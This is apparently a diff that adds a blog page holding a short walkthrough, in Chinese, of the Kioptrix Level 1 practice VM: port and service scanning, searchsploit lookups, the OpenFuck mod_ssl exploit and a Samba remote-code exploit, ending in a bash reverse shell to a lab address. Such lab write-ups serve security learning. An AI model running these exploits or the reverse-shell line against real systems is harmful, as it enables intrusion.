@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html>
+        <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <title>Kioptrix: Level 1 | 老白</title>
+        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body>
+              <header class="header mdui-m-b-5">      
+            <div class="container  ">
+                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
+                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
+           
+            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
+                   
+                            <li><a href="/">首页</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/archives">归档</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                  </nav>
+                </div>
+        </header>
+        <div class="mdui-container ">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">Kioptrix: Level 1</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-07-10 19:19:26">2021-07-10 / 2 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="主机扫描">主机扫描</h1>
+<p><code>netdiscover -i eth0 -r 192.168.223.135</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644924059869.png" alt="" loading="lazy"></p>
+<h1 id="端口探测">端口探测</h1>
+<p><code>masscan -p 0-65535 --rate=10000 192.168.223.136</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644924298546.png" alt="" loading="lazy"></p>
+<h1 id="服务探测">服务探测</h1>
+<p><code>nmap -A -sV -T4 -O -p 22,1024,139,80,111,443 192.168.223.136</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644924453316.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644924336402.png" alt="" loading="lazy"></p>
+<h1 id="web">web</h1>
+<p><code>Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644924623623.png" alt="" loading="lazy"></p>
+<p>  爆一下路径<br>
+<code>Dirb http://192.168.223.136 /usr/share/dirb/wordlists/big.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644924713053.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644924964453.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644924986104.png" alt="" loading="lazy"><br>
+ 发现openssl版本0.9.6，版本过低，以至于不存在心脏滴血，Mod_ssl版本2.8.4<br>
+<code>searchsploit mod_ssl</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925058787.png" alt="" loading="lazy"><br>
+ 缓冲区溢出<br>
+<img src="https://V-alkoinen.github.io/post-images/1644925109083.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925114649.png" alt="" loading="lazy"><br>
+<code>apt-get install libssl-dev</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925186920.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925192673.png" alt="" loading="lazy"></p>
+<pre><code>用法: ./OpenFuck target host [port] [-c N]	
+C:开放n个连接
+系统:redhat 	
+apache: 1.3.20
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1644925238614.png" alt="" loading="lazy"><br>
+<code>./OpenFuck 0x6a 192.168.223.136 -c 50</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925261719.png" alt="" loading="lazy"><br>
+ 报错，选用0x6b<br>
+<code>./OpenFuck 0x6b 192.168.223.136 -c 50</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925302425.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925357759.png" alt="" loading="lazy"></p>
+<h1 id="samba">Samba</h1>
+<p><img src="https://V-alkoinen.github.io/post-images/1644925395072.png" alt="" loading="lazy"><br>
+<code>Searchsploit samba</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925419833.png" alt="" loading="lazy"><br>
+ 找一个RCE然后复制到本地<br>
+<code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c ./</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925455439.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925472362.png" alt="" loading="lazy"><br>
+<code>./exp -c 192.168.223.134 -b=0 192.168.223.136</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1644925495227.png" alt="" loading="lazy"></p>
+<pre><code>本地监听端口 nc –nvlp 4444
+远程弹bash
+bash -i &gt;&amp; /dev/tcp/192.168.223.134/4444 0&gt;&amp;1
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644925532107.png" alt="" loading="lazy"></figure>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/Dependency Confusion/">Dependency Confusion</a></div></div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/gophish-diao-yu-gong-ju-shi-yong/">gophish钓鱼工具使用</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
+                        </div>
+                      </div>
+    
+                
+
+              </div>
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      </ul>
+                    </nav>
+                    <div class="copyright">
+                      
+                  </div>
+                  
+              </footer>
+    </body>
+</html>
